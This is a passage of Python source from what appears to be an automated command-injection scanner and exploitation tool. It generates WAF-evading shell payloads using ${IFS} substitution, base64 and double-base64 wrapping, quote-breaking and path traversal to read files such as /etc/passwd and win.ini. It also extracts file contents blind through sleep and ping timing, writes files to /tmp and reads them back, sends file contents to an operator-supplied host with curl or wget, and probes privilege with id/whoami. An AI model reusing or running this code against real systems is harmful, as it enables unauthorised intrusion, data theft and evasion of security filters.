            ("sleep",   f"sleep{ifs}{delay}"),
            ("ping",    f"ping{ifs}-c{ifs}{delay}{ifs}127.0.0.1{ifs}>/dev/null{ifs}2>&1"),
            ("read-t",  f"read{ifs}-t{ifs}{delay}{ifs}</dev/null"),
        ]
        # Sort: confirmed method first
        delay_bodies.sort(key=lambda x: 0 if x[0] == delay_method else 1)
        for method, body in delay_bodies:
            cmds.append((
                f"{cond};{ifs}then{ifs}{body};{ifs}fi",
                method
            ))
        return cmds

    @staticmethod
    def _blind_char_cmd(fpath: str, pos: int, char: str, delay: int = 5) -> str:
        """
        if [ "$(head -c <pos+1> <fpath> | tail -c 1)" = "<char>" ]; then sleep <delay>; fi
        Extracts one byte at position <pos> (0-indexed) by comparing to <char>.
        Space-free via ${IFS}.
        """
        extract = (f"$(head${{IFS}}-c${{IFS}}{pos+1}${{IFS}}{fpath}"
                   f"${{IFS}}|${{IFS}}tail${{IFS}}-c${{IFS}}1)")
        return (f"if${{IFS}}[${{IFS}}\"{extract}\"${{IFS}}=${{IFS}}\"{char}\""
                f"${{IFS}}];${{IFS}}then${{IFS}}sleep${{IFS}}{delay};${{IFS}}fi")

    @staticmethod
    def _blind_oob_exfil_cmd(fpath: str, oob_host: str, oob_port: int,
                              token: str) -> str:
        """
        OOB file exfiltration via curl (space-free):
          curl${IFS}-s${IFS}http://HOST:PORT/?t=TOKEN&d=$(cat${IFS}<fpath>|base64)
        Falls back to wget if curl fails.
        """
        import base64 as _b
        b64_tok = _b.b64encode(token.encode()).decode()[:16]
        curl = (f"curl${{IFS}}-s${{IFS}}-m${{IFS}}8${{IFS}}"
                f"http://{oob_host}:{oob_port}/?t={b64_tok}"
                f"\\&d=$(cat${{IFS}}{fpath}|base64${{IFS}}-w0)")
        wget = (f"wget${{IFS}}-q${{IFS}}-O${{IFS}}/dev/null${{IFS}}"
                f"http://{oob_host}:{oob_port}/?t={b64_tok}"
                f"\\&d=$(cat${{IFS}}{fpath}|base64${{IFS}}-w0)")
        return curl + "||" + wget

    @staticmethod
    def _blind_oob_exfil_b64(fpath: str, oob_host: str, oob_port: int,
                              token: str) -> str:
        """
        B64-encoded version of _blind_oob_exfil_cmd for WAF bypass.
        The whole OOB command is b64-encoded and unwrapped via echo|base64 -d|sh.
        """
        raw = Injector._blind_oob_exfil_cmd(fpath, oob_host, oob_port, token)
        return Injector._b64_file_cmd(raw)

    def _build_direct_payloads(self, fpath, separator, wv_mode=False, input_encoding="none"):
        """
        Build all direct-output file-read payloads for a given file path.

        Layers (in order):
          0. WV-mode (whole-value replace): b64-encoded file-read commands sent
             as full param replacement — used when endpoint decodes b64 input.
             Promoted to front when wv_mode=True or input_encoding=='base64'.
          1. Standard cat variants (IFS/tab/brace/alt-cmd) — no spaces
          2. B64-encoded file-read command (WAF keyword bypass)
          3. Double-B64-encoded file-read command (multi-layer WAF)
          4. Path-traversal combined variants (../../../etc/passwd)
          5. URL-encoded path variants (%2f, %252f)
        """
        is_win = (self.os_target == "windows")
        variants = self._TYPE_VARIANTS_WIN if is_win else self._CAT_VARIANTS

        if is_win:
            seps = [s for s in [separator, "&", "|", "&&"] if s]
        else:
            seps = [s for s in [separator, ";", "|", "&&", "||"] if s]
        seen_s = set(); seps = [s for s in seps if not (s in seen_s or seen_s.add(s))]

        payloads = []
        seen_pl  = set()

        def add_pl(pl, vname):
            if pl not in seen_pl:
                seen_pl.add(pl)
                payloads.append((pl, vname))

        # ── Layer 0: WV-replace mode ──────────────────────────────────────
        # When the endpoint base64-decodes the param before passing to shell,
        # the correct payload IS the b64 of the file-read command (no separator).
        # Promoted to front when wv_mode=True or input_encoding=='base64'.
        _want_wv = wv_mode or input_encoding == "base64"
        if _want_wv and not is_win:
            ifs_read  = f"cat${{IFS}}{fpath}"
            tab_read  = f"cat\t{fpath}"
            head_read = f"head${{IFS}}-n${{IFS}}99${{IFS}}{fpath}"
            # WV: b64(cmd) — full param replacement
            for cmd, lbl in [(ifs_read, "wv/b64-cat-ifs"), (tab_read, "wv/b64-cat-tab"),
                              (head_read, "wv/b64-head")]:
                import base64 as _bx
                b64_cmd = _bx.b64encode(cmd.encode()).decode()
                add_pl(b64_cmd, lbl)
            # WV: dbl-b64(cmd) — multi-layer (if single b64 is processed but not executed)
            for cmd, lbl in [(ifs_read, "wv/dbl-b64-cat"), (head_read, "wv/dbl-b64-head")]:
                import base64 as _bx
                inner = _bx.b64encode(cmd.encode()).decode()
                outer = _bx.b64encode(inner.encode()).decode()
                add_pl(outer, lbl)

        # ── Layer 1: standard cat variants ───────────────────────────────
        for sep in seps:
            for vname, cmd_fn in variants:
                cmd = cmd_fn(fpath)
                if cmd.startswith(("$(", "`", "'", '"', "\n", "if", "{")):
                    add_pl(cmd, vname)
                else:
                    add_pl(f"{sep}{cmd}", f"{sep}/{vname}")

        # ── Layer 2: B64-encoded IFS read command ─────────────────────────
        ifs_read  = f"cat${{IFS}}{fpath}"
        tab_read  = f"cat\t{fpath}"
        b64_ifs   = self._b64_file_cmd(ifs_read)
        b64_tab   = self._b64_file_cmd(tab_read)
        for sep in seps:
            add_pl(f"{sep}{b64_ifs}", f"{sep}/b64-ifs-cat")
            add_pl(f"{sep}{b64_tab}", f"{sep}/b64-tab-cat")

        # head/base64 variants (in case cat is fully blocked even in b64)
        b64_head  = self._b64_file_cmd(f"head${{IFS}}-n${{IFS}}99${{IFS}}{fpath}")
        b64_base  = self._b64_file_cmd(f"base64${{IFS}}{fpath}")
        for sep in seps:
            add_pl(f"{sep}{b64_head}", f"{sep}/b64-head")
            add_pl(f"{sep}{b64_base}", f"{sep}/b64-base64")

        # ── Layer 3: Double-B64-encoded read (multi-layer WAF) ────────────
        # Also promoted to front when single-layer b64 is known insufficient
        dbl_ifs   = self._dbl_b64_file_cmd(ifs_read)
        dbl_head  = self._dbl_b64_file_cmd(f"head${{IFS}}-n${{IFS}}99${{IFS}}{fpath}")
        _dbl_seps = seps  # apply to all seps if multi-layer needed
        if input_encoding in ("base64",) or wv_mode:
            # Already covered above in Layer 0; add append-mode dbl-b64 too
            for sep in _dbl_seps[:3]:
                add_pl(f"{sep}{dbl_ifs}",  f"{sep}/dbl-b64-ifs-cat")
                add_pl(f"{sep}{dbl_head}", f"{sep}/dbl-b64-head")
        else:
            for sep in seps[:2]:
                add_pl(f"{sep}{dbl_ifs}",  f"{sep}/dbl-b64-ifs-cat")
                add_pl(f"{sep}{dbl_head}", f"{sep}/dbl-b64-head")

        # ── Layer 4: Path traversal variants ──────────────────────────────
        traversal_prefixes = [
            "../../..",
            "../../../..",
            "../../../../..",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%252e%252e%252f%252e%252e%252f",
            "....//....//....//",
        ]
        if not is_win and fpath.startswith("/"):
            fname = fpath.lstrip("/")
            for pfx in traversal_prefixes:
                tpath = pfx + "/" + fname if not pfx.endswith("/") else pfx + fname
                tcmd = f"cat${{IFS}}{tpath}"
                b64_tcmd = self._b64_file_cmd(tcmd)
                for sep in seps[:2]:
                    add_pl(f"{sep}{tcmd}", f"{sep}/traversal")
                    add_pl(f"{sep}{b64_tcmd}", f"{sep}/b64-traversal")

        return payloads

    def _build_redirect_payloads(self, fpath, tmp_out, separator):
        """
        Build (write_variants, readback_variants) for Strategy B.
        All Linux write commands are IFS-safe (no plain spaces).
        Also includes b64-encoded write commands for WAF bypass.
        """
        is_win = (self.os_target == "windows")

        if is_win:
            win_tmp = "C:\\Windows\\Temp\\"
            out = win_tmp + tmp_out.split("/")[-1]
            write_variants = [
                (f"& type {fpath} > {out}",                              "write/type"),
                (f"& TYPE {fpath} > {out}",                              "write/TYPE"),
                (f"& cmd /c type {fpath} > {out}",                       "write/cmd"),
                (f"& powershell -Command \"Get-Content '{fpath}' | Set-Content '{out}'\"",
                                                                          "write/ps"),
                (f"& powershell -c gc {fpath} > {out}",                  "write/ps-short"),
            ]
            read_back_variants = [
                (f"& type {out}",              "readback/type"),
                (f"& TYPE {out}",              "readback/TYPE"),
                (f"& cmd /c type {out}",       "readback/cmd"),
                (f"& powershell -c gc {out}",  "readback/ps"),
            ]
            return write_variants, read_back_variants

        out  = tmp_out
        seps = [separator, ";", "|", "&&", "||"]
        seen = set()
        seps = [s for s in seps if not (s in seen or seen.add(s))]

        write_variants = []

        # ── IFS-safe write commands ────────────────────────────────────────
        for sep in seps:
            # Standard IFS-bypass cat redirect
            write_variants.append((f"{sep}cat${{IFS}}{fpath}${{IFS}}>{out}",    f"write/{sep}/ifs"))
            write_variants.append((f"{sep}ca''t${{IFS}}{fpath}${{IFS}}>{out}",  f"write/{sep}/ifs-quote"))
            write_variants.append((f"{sep}CaT${{IFS}}{fpath}${{IFS}}>{out}",    f"write/{sep}/ifs-case"))
            write_variants.append((f"{sep}head${{IFS}}-n${{IFS}}99${{IFS}}{fpath}${{IFS}}>{out}",
                                                                                  f"write/{sep}/ifs-head"))
            write_variants.append((f"{sep}tac${{IFS}}{fpath}${{IFS}}>{out}",    f"write/{sep}/ifs-tac"))
            write_variants.append((f"{sep}base64${{IFS}}{fpath}${{IFS}}>{out}", f"write/{sep}/ifs-base64"))
            # Tab separator
            write_variants.append((f"{sep}cat\t{fpath}\t>{out}",                f"write/{sep}/tab"))

        # Newline-prefix variants (IFS-safe)
        write_variants.append((f"\ncat${{IFS}}{fpath}${{IFS}}>{out}",           "write/nl/ifs"))
        write_variants.append((f"\nca''t${{IFS}}{fpath}${{IFS}}>{out}",         "write/nl/ifs-quote"))
        write_variants.append((f"%0acat${{IFS}}{fpath}${{IFS}}>{out}",          "write/url-nl/ifs"))
        write_variants.append((f"%0aCaT${{IFS}}{fpath}${{IFS}}>{out}",          "write/url-nl/ifs-case"))

        # Quote-break variants (IFS-safe)
        write_variants.append((f"';cat${{IFS}}{fpath}${{IFS}}>{out} #",         "write/qbreak-sq/ifs"))
        write_variants.append((f'";cat${{IFS}}{fpath}${{IFS}}>{out} #',         "write/qbreak-dq/ifs"))

        # ── B64-encoded write command (bypasses cat/path keyword filters) ─
        b64_write_ifs  = self._b64_file_cmd(f"cat${{IFS}}{fpath}${{IFS}}>{out}")
        b64_write_head = self._b64_file_cmd(
            f"head${{IFS}}-n${{IFS}}99${{IFS}}{fpath}${{IFS}}>{out}")
        for sep in seps[:3]:
            write_variants.append((f"{sep}{b64_write_ifs}",  f"write/{sep}/b64-ifs"))
            write_variants.append((f"{sep}{b64_write_head}", f"write/{sep}/b64-head"))

        # ── Read-back variants ─────────────────────────────────────────────
        read_back_variants = []
        for sep in seps:
            read_back_variants.append((f"{sep}cat${{IFS}}{out}",               f"readback/{sep}/ifs"))
            read_back_variants.append((f"{sep}ca''t${{IFS}}{out}",             f"readback/{sep}/ifs-quote"))
            read_back_variants.append((f"{sep}CaT${{IFS}}{out}",               f"readback/{sep}/ifs-case"))
            read_back_variants.append((f"{sep}head${{IFS}}-n${{IFS}}99${{IFS}}{out}",
                                                                                 f"readback/{sep}/ifs-head"))
            read_back_variants.append((f"{sep}cat\t{out}",                     f"readback/{sep}/tab"))

        read_back_variants.append((f"$(cat${{IFS}}{out})",                     "readback/subshell/ifs"))
        read_back_variants.append((f"`cat${{IFS}}{out}`",                      "readback/backtick/ifs"))
        read_back_variants.append((f"\ncat${{IFS}}{out}",                      "readback/nl/ifs"))
        read_back_variants.append((f"%0acat${{IFS}}{out}",                     "readback/url-nl/ifs"))
        read_back_variants.append((f"';cat${{IFS}}{out} #",                    "readback/qbreak-sq/ifs"))
        read_back_variants.append((f'";cat${{IFS}}{out} #',                    "readback/qbreak-dq/ifs"))

        return write_variants, read_back_variants

    @staticmethod
    def _maybe_decode_base64(body, confirm_re, extract_fn):
        import base64 as _b64
        text = Injector._strip_html(body)
        for chunk in re.findall(r"[A-Za-z0-9+/=]{40,}", text):
            chunk = chunk.strip()
            pad = (4 - len(chunk) % 4) % 4
            try:
                decoded = _b64.b64decode(chunk + "=" * pad).decode("utf-8", errors="replace")
                if confirm_re.search(decoded):
                    snippet = extract_fn(decoded)
                    if snippet:
                        return snippet, True
            except Exception:
                continue
        return None, False

    def _try_file_read(self, endpoint, param, separator, blind_context=False,
                       wv_mode=False, input_encoding="none"):
        """
        Attempt to read a sensitive file after confirmed injection.

        Four strategies tried in order per target file:

        Strategy A — Direct output (IFS/tab/brace/b64/alt-cmds/traversal)
          Fires read command appended to param.  Checks raw body and b64-
          decoded body chunks.  Stops at first successful read.

        Strategy B — Write to /tmp, readback via injection (IFS-safe)
          Writes file to /tmp/hh_*.txt then reads it back.  All write and
          readback commands use ${IFS} instead of spaces.  Also tries b64-
          encoded write commands for WAF bypass.

        Strategy C — Blind time-based existence proof + char extraction
          Used when output is never reflected.
            C1: if [ -f <file> ]; then sleep 5; fi  (proves existence)
            C2: if [ "$(head -c 1 <file>)" = "<c>" ]; then sleep 5; fi
                (char-by-char extraction of first 20 bytes)

        blind_context=True: skip A and B immediately (no output, don't waste
        requests) — jump straight to Strategy C (time-based).
        After C, fall back to A/B in case the endpoint reflects partial output
        only for certain commands.
        """
        is_windows  = (self.os_target == "windows")
        file_targets = self._WIN_FILES if is_windows else self._LINUX_FILES
        token_short = self.token[:8].lower()
        tmp_out = f"/tmp/hh_{token_short}.txt"
        if is_windows:
            tmp_out = f"C:\\Windows\\Temp\\hh_{token_short}.txt"

        for fpath, read_tpl, confirm_re, extract_fn in file_targets:
            _ab_failed = True  # True until A or B produces a result

            if not blind_context:
                _ab_failed = True  # flipped to False if A or B succeeds
                # ── STRATEGY A: direct output ──────────────────────────────────
                sys.stdout.write(
                    "\r  " + color("  [file-read] Strategy A: direct " + fpath, C.DIM) + "  "
                )
                sys.stdout.flush()
                for pl, vname in self._build_direct_payloads(
                        fpath, separator, wv_mode=wv_mode, input_encoding=input_encoding):
                    try:
                        resp = self._send(endpoint, param, pl)
                        body = resp.get("body", "")
                        if not body:
                            continue
                        if confirm_re.search(body):
                            snippet = extract_fn(body)
                            if snippet:
                                return fpath, snippet, pl
                        # Always try b64-decode — catches base64-read and b64-wrap outputs
                        snippet, ok = self._maybe_decode_base64(body, confirm_re, extract_fn)
                        if ok:
                            return fpath, f"[base64-decoded]\n{snippet}", pl
                    except Exception:
                        continue

                # ── STRATEGY B: write to /tmp, read back via injection ─────────
                sys.stdout.write(
                    "\r  " + color("  [file-read] Strategy B: write→readback " + fpath, C.DIM) + "  "
                )
                sys.stdout.flush()
                write_variants, read_back_variants = self._build_redirect_payloads(
                    fpath, tmp_out, separator
                )
                for write_pl, w_vname in write_variants:
                    try:
                        self._send(endpoint, param, write_pl)
                    except Exception:
                        continue
                    time.sleep(0.2)
                    for rb_pl, rb_vname in read_back_variants:
                        try:
                            resp = self._send(endpoint, param, rb_pl)
                            body = resp.get("body", "")
                            if not body:
                                continue
                            if confirm_re.search(body):
                                snippet = extract_fn(body)
                                if snippet:
                                    return fpath, snippet, f"{write_pl}  →  {rb_pl}"
                            snippet, ok = self._maybe_decode_base64(body, confirm_re, extract_fn)
                            if ok:
                                return fpath, f"[base64-decoded]\n{snippet}", f"{write_pl}  →  {rb_pl}"
                        except Exception:
                            continue

            # ── STRATEGY C: blind time-based existence + char extraction ───
            # GUARD: only run when we actually need time-based detection:
            #   blind_context=True  → output never reflected, time is only oracle
            #   _ab_failed=True     → A and B both returned nothing for this file
            # On a direct-output endpoint where A/B succeeded, skip C entirely.
            # This prevents dozens of sleep/ping requests on a simple site that
            # already reflected the file content in plain text.
            if not blind_context and not _ab_failed:
                continue  # A or B worked — no need for time-based oracle
            # GUARD: Strategy C must only run when:
            #   a) blind_context=True (injection confirmed but output never reflected)
            #   b) OR Strategies A and B both failed for this file (tracked above)
            # Never run time-based file probing on a normal direct-output endpoint —
            # it wastes dozens of requests and burns time on sleep delays.
            sys.stdout.write(
                "\r  " + color("  [file-read] Strategy C: blind-time " + fpath, C.DIM) + "  "
            )
            sys.stdout.flush()

            # Build baseline before timed probes
            try:
                base_r    = self._baseline(endpoint)
                base_time = base_r["elapsed"]
            except Exception:
                base_time = 0.5

            # Adaptive delay: try 5s first, fall back to full threshold
            delay_candidates = sorted(set([5, int(self.time_threshold)]))

            # C1 – existence check using multiple delay methods
            # Try sleep, ping -c N, read -t N in order until one confirms
            file_exists   = False
            found_delay   = delay_candidates[0]
            confirmed_sep = ";"
            confirmed_method = "sleep"  # whichever delay method worked
            confirmed_exist_cmd = ""

            for d in delay_candidates:
                if file_exists:
                    break
                exist_variants = self._blind_exist_cmds(fpath, d)
                # Control: same structure but checks a nonexistent file
                ctrl_variants  = self._blind_exist_cmds("/tmp/hh_noexist_ctrl_x7z", d)
                for (exist_cmd, e_method), (ctrl_cmd, _) in zip(exist_variants, ctrl_variants):
                    for sep in (";", "|", "&&", "\n"):
                        try:
                            r_exist = self._send(endpoint, param, sep + exist_cmd)
                            r_ctrl  = self._send(endpoint, param, sep + ctrl_cmd)
                            elapsed_exist = r_exist.get("elapsed", 0)
                            elapsed_ctrl  = r_ctrl.get("elapsed", 0)
                            if (elapsed_exist >= base_time + d * 0.6 and
                                    elapsed_ctrl < base_time + d * 0.5):
                                file_exists      = True
                                found_delay      = d
                                confirmed_sep    = sep
                                confirmed_method = e_method
                                confirmed_exist_cmd = exist_cmd
                                vdim(f"[file-read] C1 confirmed: {fpath} exists via {e_method} delay={d}s sep={sep!r}")
                                break
                        except Exception:
                            continue
                    if file_exists:
                        break

            if file_exists:
                # C2 – char-by-char extraction using confirmed delay method
                # Use _blind_char_cmds which tries confirmed method first
                extracted = []
                CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:_/. -\n"
                for pos in range(20):
                    found_char = None
                    for ch in CHARSET:
                        char_variants = self._blind_char_cmds(
                            fpath, pos, ch, found_delay, confirmed_method)
                        for char_cmd, _ in char_variants:
                            try:
                                r = self._send(endpoint, param,
                                               confirmed_sep + char_cmd)
                                if r.get("elapsed", 0) >= base_time + found_delay * 0.6:
                                    found_char = ch
                                    break
                            except Exception:
                                continue
                        if found_char:
                            break
                    if found_char:
                        extracted.append(found_char)
                    else:
                        break

                snippet = "".join(extracted)
                delay_label = confirmed_method
                if snippet:
                    return (fpath,
                            f"[blind-time-extract/{delay_label}] first chars: {snippet!r}",
                            f"{confirmed_sep}{confirmed_exist_cmd}")
                return (fpath,
                        f"[blind-time/{delay_label}] {fpath} confirmed to exist",
                        f"{confirmed_sep}{confirmed_exist_cmd}")

            # ── blind_context fallback: try A/B after C ────────────────────
            if blind_context:
                sys.stdout.write(
                    "\r  " + color("  [file-read] C no hit — trying A/B fallback " + fpath, C.DIM) + "  "
                )
                sys.stdout.flush()
                for pl, vname in self._build_direct_payloads(
                        fpath, separator, wv_mode=wv_mode, input_encoding=input_encoding):
                    try:
                        resp = self._send(endpoint, param, pl)
                        body = resp.get("body", "")
                        if not body:
                            continue
                        if confirm_re.search(body):
                            snippet = extract_fn(body)
                            if snippet:
                                return fpath, snippet, pl
                        snippet, ok = self._maybe_decode_base64(body, confirm_re, extract_fn)
                        if ok:
                            return fpath, f"[base64-decoded]\n{snippet}", pl
                    except Exception:
                        continue

        sys.stdout.write("\r" + " " * 65 + "\r")
        return None, None, None

    def _detect_privilege(self, endpoint, param, separator, os_type):
        """
        Inst 9 — Privilege level detection.
        After direct-output injection confirmed, fire a privilege-identification
        payload and parse the output. Returns a string describing the privilege
        context, or None if detection fails.
        """
        try:
            if os_type == "linux":
                _pl = separator + "id"
                r = self._send(endpoint, param, _pl)
                body = r.get("body", "") or ""
                m = SYSTEM_PATTERNS["linux_id"].search(body)
                if m:
                    return m.group().strip()
                m2 = SYSTEM_PATTERNS["linux_user"].search(body)
                if m2:
                    return f"user={m2.group().strip()}"
            else:
                _pl = separator + "whoami"
                r = self._send(endpoint, param, _pl)
                body = r.get("body", "") or ""
                m = SYSTEM_PATTERNS["win_user"].search(body)
                if m:
                    return m.group().strip()
        except Exception:
            pass
        return None


    def _record_vuln(self, endpoint, param, pl, desc, verify_type, is_time,
                     pl_os, evidence, status_code, elapsed, baseline_time,
                     confirmed_sep=";", param_enc="none"):
        method = endpoint["method"]
        # Decode the payload to its human-readable meaning
        decoded_pl = decode_payload(pl, desc)
        # WV (whole-value) mode: entire param was replaced with b64 payload,
        # not appended. Detected from desc label or pure-b64 payload shape.
        import re as _re
        _is_wv = (
            "WV:" in desc or "WV-b64" in desc or "WV-B64" in desc or
            "Whole-val B64" in desc or "[ADAPTIVE" in desc and "WV" in desc or
            bool(_re.match(r'^[A-Za-z0-9+/=]{4,}$', pl)) and
            not any(c in pl for c in (';', '|', '&', '$', '\n', ' ', '\t'))
        )
        
        # Inst 8: shell context
        if pl_os == "windows":
            _shell_ctx = ("PowerShell" if "powershell" in pl.lower() else "cmd.exe")
        else:
            _shell_ctx = "Linux shell"

        # Inst 9: privilege detection on direct-output confirmations
        _priv_ctx = None
        if not is_time and not verify_type.startswith(("redirect:", "oob")):
            _priv_ctx = self._detect_privilege(endpoint, param, confirmed_sep, pl_os)
        _severity = "confirmed"
        if _priv_ctx:
            _pl = _priv_ctx.lower()
            if any(x in _pl for x in ("root", "system", "administrator", "uid=0")):
                _severity = "CRITICAL — root/SYSTEM"

        # Inst 10: reflected input (passive)
        _reflected = bool(
            endpoint["params"].get(param, "") and
            str(endpoint["params"].get(param, "")) in (evidence or ""))

        # Inst 11: sink hint annotation from crawl
        _sink_hint = endpoint.get("sink_hint") or None

        # Inst 12: param_location and filter fingerprint
        _param_loc = endpoint.get("param_location") or (
            "header" if endpoint.get("source") == "header_inject"
            else "body" if method == "POST" else "query")
        _ff_key = (endpoint["url"], method, param)
        _ff_raw = self._filter_fingerprints.get(_ff_key)
        _ff_str = ("".join(sorted(_ff_raw)) if _ff_raw is not None else None)

        finding = {
            "endpoint":          endpoint["url"],
            "parameter":         param,
            "method":            method,
            "param_location":    _param_loc,
            "payload":           pl,
            "payload_decoded":   decoded_pl,
            "is_wv_mode":        _is_wv,
            "description":       desc,
            "evidence":          evidence,
            "verify_type":       verify_type,
            "detection_method":  ("direct-output" if not is_time and
                                  not verify_type.startswith(("redirect:", "oob"))
                                  else "timing" if is_time
                                  else "redirect" if verify_type.startswith("redirect:")
                                  else "oob"),
            "status_code":       status_code,
            "elapsed":           f"{elapsed:.2f}s",
            "baseline":          f"{baseline_time:.2f}s",
            "is_time_based":     is_time,
            "os_type":           pl_os,
            "shell_context":     _shell_ctx,
            "source":            endpoint["source"],
            "param_risk":        ("high" if risk_score(param) >= 2
                                  else "medium" if risk_score(param) == 1 else "low"),
            "severity":          _severity,
            "privilege_context": _priv_ctx,
            "filter_fingerprint": _ff_str,
            "sink_hint":         _sink_hint,
            "base_params":       {k: v for k, v in endpoint["params"].items()
                                  if k in (endpoint.get("priority_params") or [])
                                  or k == param},
            "hidden_params":     dict(endpoint.get("hidden", {})),
            "confirmed_sep":     confirmed_sep,
            "param_enc":         param_enc,
            "secondary_findings": (
                [{"type": "reflected_input",
                  "detail": "Raw param value appears verbatim in response/evidence"}]
                if _reflected else []),
            "content_type":      endpoint.get("content_type", ""),
        }
        poc = build_poc(finding)
        finding["poc"] = poc
        with self._lock:
            self.findings.append(finding)

        if is_time:                              inj_type = "BLIND:TIME-DELAY"
        elif verify_type.startswith("redirect:"):inj_type = "BLIND:OUT-REDIRECT"
        elif verify_type == "oob":               inj_type = "BLIND:OOB-INTERACT"
        elif verify_type == "oob_data":          inj_type = "BLIND:OOB-EXFIL"
        elif "no direct output" in evidence and "Execution confirmation" in evidence:
                                                 inj_type = "BLIND:EXEC-CONFIRM"
        else:                                    inj_type = "DIRECT OUTPUT"

        ev_s = evidence[:72] + "…" if len(evidence) > 74 else evidence
        sys.stdout.write("\r" + " " * 65 + "\r")
        tprint(f"\n  {color('VULN', C.BRED, C.BOLD)} {color(method, C.BYELLOW)} {color(endpoint['url'], C.BWHITE)}")
        tprint(f"  {color('  param    :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
        # Show raw payload + WV note if whole-value replace mode
        wv_note_live = color("  [WV-replace mode]", C.DIM) if _is_wv else ""
        # Escape control chars in payload so newlines/tabs don't break terminal layout
        _pl_display = pl.replace('\n', '\\n').replace('\r', '\\r').replace('\t', '\\t')
        tprint(f"  {color('  payload  :', C.DIM)} {color(_pl_display, C.BRED)}{wv_note_live}")
        # Always show decoded meaning below the raw payload.
        if decoded_pl != pl:
            tprint(f"  {color('  decoded  :', C.DIM)} {color(decoded_pl, C.BYELLOW)}")
        tprint(f"  {color('  type     :', C.DIM)} {color(inj_type, C.BMAGENTA)}")
        tprint(f"  {color('  evidence :', C.DIM)} {color(ev_s, C.BGREEN)}")
        if poc and poc.get("browser_url"):
            tprint(f"  {color('  browser  :', C.DIM)} {color(poc['browser_url'], C.BCYAN)}")
        tprint(f"  {color('  curl     :', C.DIM)} {color(poc['curl_cmd'], C.BYELLOW)}")

    def _do_file_read(self, endpoint, param, separator, blind_context=False,
                      wv_mode=False, input_encoding="none"):
        sys.stdout.write("\r" + " " * 65 + "\r")
        tprint(f"\n  {color('FILE READ', C.BMAGENTA, C.BOLD)} attempting proof-of-read on confirmed injection...")
        tprint(f"  {color('  param   :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
        tprint(f"  {color('  target  :', C.DIM)} {color('/etc/passwd  (Linux)  |  win.ini / hosts  (Windows)', C.DIM)}")

        if blind_context:
            strats = "C:blind-time-extract [blind] → A:direct → B:/tmp-write→readback"
        else:
            strats = "A:direct  B:/tmp-write→readback  C:blind-time-extract"
        enc_note = f"  [encoding: {input_encoding}]" if input_encoding != "none" else ""
        wv_note  = "  [WV-replace mode]" if wv_mode else ""
        tprint(f"  {color('  methods :', C.DIM)} {color(strats, C.DIM)}{color(enc_note + wv_note, C.DIM)}")
        sys.stdout.flush()

        fpath, full_content, used_pl = self._try_file_read(
            endpoint, param, separator,
            blind_context=blind_context, wv_mode=wv_mode, input_encoding=input_encoding)
        sys.stdout.write("\r" + " " * 65 + "\r")

        if fpath and full_content:
            # Determine which strategy succeeded from payload/content markers
            if "[blind-time-extract]" in full_content:
                strategy = "C: blind time-based char extraction"
            elif "[blind-time]" in full_content:
                strategy = "C: blind time-based existence confirmation"
            elif "→" in used_pl:
                strategy = "B: /tmp write + injected readback (IFS-safe)"
            elif "[base64-decoded]" in full_content:
                strategy = "A: direct output (base64 decoded)"
            else:
                strategy = "A: direct output (IFS/tab/brace/alt-cmd)"

            tprint(f"  {color('FILE READ', C.BMAGENTA, C.BOLD)} {color('SUCCESS', C.BGREEN, C.BOLD)}  {color(fpath, C.BYELLOW, C.BOLD)}")
            tprint(f"  {color('  strategy:', C.DIM)} {color(strategy, C.BCYAN)}")

            entry = {
                "endpoint": endpoint["url"],
                "param":    param,
                "file":     fpath,
                "payload":  used_pl,
                "strategy": strategy,
                "content":  full_content,
            }
            with self._lock:
                self.file_reads.append(entry)
        else:
            tprint(f"  {color('FILE READ', C.BMAGENTA, C.BOLD)} "
                   f"{color('no output reflected — all 4 strategies failed, injection confirmed blind', C.DIM)}")

    # ─────────────────────────────────────────────────────────────────────────
    # test_endpoint — ORIGINAL 4-tier logic + Tier 5 adaptive bypass
    # ─────────────────────────────────────────────────────────────────────────
    def test_endpoint(self, endpoint, ep_num, ep_total):
        # Build ordered param list: priority_params (JSON-derived, high-confidence)
        # first, then remaining params keys, deduped preserving order.
        _pp = endpoint.get("priority_params") or []
        _seen_params = set(_pp)
        _rest = [p for p in endpoint["params"] if p not in _seen_params]
        params_list = list(_pp) + _rest
        # Reset per-endpoint encoding state so stale state from a previous
        # endpoint never bleeds into unrelated params on the next endpoint.
        self._param_enc_state = {}

        # FIX ORDER-DISPLAY: Print explicit "now testing endpoint N/total" header
        # so the operator can verify high-risk endpoints are being tested first.
        _ep_url_short = endpoint["url"]
        _ep_method = endpoint["method"]
        _ep_src = endpoint.get("source", "") or ""
        _ep_conf = set(endpoint.get("priority_params") or [])
        _ep_risky = [p for p in _ep_conf if risk_score(p) >= 2]
        _risk_marker = color("[HIGH]", C.BRED + C.BOLD) if _ep_risky else color("[LOW]", C.DIM)
        _ep_pnames = ", ".join(list(endpoint["params"].keys())[:4])
        if _ep_risky:
            sys.stdout.write("\r" + " " * 80 + "\r")
            tprint("  " + color(f"[{ep_num}/{ep_total}]", C.DIM) + " " + _risk_marker
                   + " " + color(_ep_method, C.BYELLOW)
                   + " " + color(_ep_url_short[:60], C.BWHITE)
                   + "  " + color(_ep_pnames, C.DIM))

        baseline = self._baseline(endpoint)
        if baseline["status"] == 0:
            return

        baseline_time = baseline["elapsed"]
        baseline_body = baseline["body"]
        self._last_baseline_time = baseline_time   # used by _adaptive_time_baseline
        # ── POST-hint pre-check (runs for ALL GET endpoints) ─────────────────────
        # If the baseline GET response signals that the server expects POST+JSON,
        # switch method now so all subsequent probing and injection uses POST.
        # This runs before the zero-param block so endpoints that already have
        # path-hint params are not bypassed.
        _post_pre_indicator = re.compile(
            r'\b(?:use\s+(?:POST|a\s+POST)|send\s+(?:a\s+)?(?:POST|JSON)|'
            r'POST\s+(?:request|method|body)|application/json|'
            r'requires?\s+(?:POST|JSON|a\s+body)|'
            r'method\s+not\s+allowed|only\s+(?:POST|JSON)(?:\s+(?:is\s+)?(?:supported|allowed))?)\b',
            re.I | re.S,
        )
        if endpoint["method"] == "GET" and baseline_body:
            if _post_pre_indicator.search(baseline_body):
                # Parse the response body for field names to inject into
                _pre_params_found = []
                _pre_seen = set(endpoint["params"].keys())
                if baseline_body.lstrip().startswith(("{", "[")):
                    try:
                        import json as _jpre
                        _pre_json = _jpre.loads(baseline_body)
                        def _pre_walk(node, depth=0):
                            if depth > 3: return
                            _skip = {'error','message','status','code','detail',
                                     'success','ok','result','data','response',
                                     'info','hint','type','timestamp','id','version'}
